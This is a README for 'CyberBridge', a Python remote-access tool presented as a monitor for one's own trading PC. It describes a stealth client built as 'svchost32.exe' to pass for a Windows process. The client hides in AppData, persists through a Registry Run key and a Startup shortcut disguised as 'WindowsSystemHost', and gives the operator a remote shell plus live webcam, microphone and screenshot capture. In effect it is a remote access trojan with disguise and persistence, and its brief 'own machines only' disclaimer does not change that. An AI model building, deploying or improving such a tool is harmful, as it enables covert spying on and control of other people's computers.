# CyberBridge 🟢

> Remote monitoring station for your personal trading PC.  
> Server UI (green/black) + stealth client compiled to `.exe`.

---

## Architecture

```
CyberBridge/
├── shared/               # Shared protocol + crypto (used by both sides)
│   ├── protocol.py       # RPC service interface definition
│   └── crypto.py         # Fernet AES-256 encryption helpers
│
├── client/               # Runs on the trading PC (compiled to .exe)
│   ├── main.py           # Entry point — persistence, RPC listener, beacons
│   ├── config.py         # SERVER_HOST and ports (edit before building)
│   └── core/
│       ├── rpc_client.py      # Full RPyC service: terminal, camera, audio, screenshot
│       ├── persistence.py     # Registry Run key + Startup shortcut + hidden install
│       └── watchdog.py        # Background watchdog thread
│
├── server/               # Runs on your machine (launches the GUI)
│   ├── main.py           # Entry point → starts Dashboard
│   ├── config.py         # Ports, timeouts, UI settings
│   ├── core/
│   │   └── session_manager.py # UDP beacon listener + client session registry
│   └── ui/
│       ├── styles.py          # Global color/font constants (green/black)
│       ├── dashboard.py       # Main window: matrix rain, tabs, session bar
│       ├── connection_panel.py # Left sidebar with live client list
│       ├── terminal_panel.py  # Remote shell with history + color output
│       ├── camera_panel.py    # Live webcam feed (~6 FPS)
│       ├── screenshot_panel.py # Capture/auto/save screenshots
│       ├── sysinfo_panel.py   # CPU/RAM bars + hardware metrics
│       └── audio_panel.py     # Mic stream + WAV recording
│
├── requirements.txt      # pip packages
├── build_client.py       # PyInstaller → dist/svchost32.exe
└── README.md
```

---

## Quick Start

### 1. Install dependencies

```bash
pip install -r requirements.txt
```

### 2. Configure the client

Edit `client/config.py`:
```python
SERVER_HOST = "YOUR.SERVER.IP.HERE"
```

### 3. Run the server (your machine)

```bash
python server/main.py

ngrok http 18812 --log=stdout
```

### 4. Build the client .exe

```bash
python build_client.py
```

This produces `dist/svchost32.exe`. Copy it to the trading PC and run it once — persistence handles the rest.

---

## Communication Flow

```
Trading PC (client)                    Your Machine (server)
──────────────────                     ─────────────────────
svchost32.exe starts
  └─ sets up Registry Run key
  └─ copies self to AppData (hidden)
  └─ opens RPC listener on :18813
  └─ sends UDP beacon every 10s ──────→ SessionManager (UDP :18812)
                                         └─ registers session
                                         └─ updates ConnectionPanel
                              ←────────  server.connect() → RPyC to :18813
                                         └─ calls exposed_execute_command()
                                         └─ calls exposed_get_camera_frame()
                                         └─ calls exposed_screenshot()
                                         └─ calls exposed_start_audio_stream()
```

---

## Client Persistence Methods

| Method | Details |
|---|---|
| Registry Run key | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsSystemHost` |
| Startup folder | `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WindowsSystemHost.lnk` |
| Hidden install dir | `%APPDATA%\Microsoft\Windows\SystemHost\svchost32.exe` (hidden attribute) |
| No console window | Built with `--noconsole` in PyInstaller |

---

## Server UI Features

| Tab | What it does |
|---|---|
| **TERMINAL** | Send commands, see stdout/stderr, command history (↑↓) |
| **SYSINFO** | Live CPU/RAM bars, disk, hostname, uptime, auto-refresh |
| **CAMERA** | Live webcam frames (~6 FPS), start/stop |
| **SCREENSHOT** | Manual or auto (10s) capture, save to Desktop |
| **AUDIO** | Stream microphone live, record to WAV |
| **MATRIX** | Animated matrix rain 😎 |

---

## Security Note

This tool is designed for **monitoring your own machines only**.  
The pre-shared key in `shared/crypto.py` should be changed before deployment.
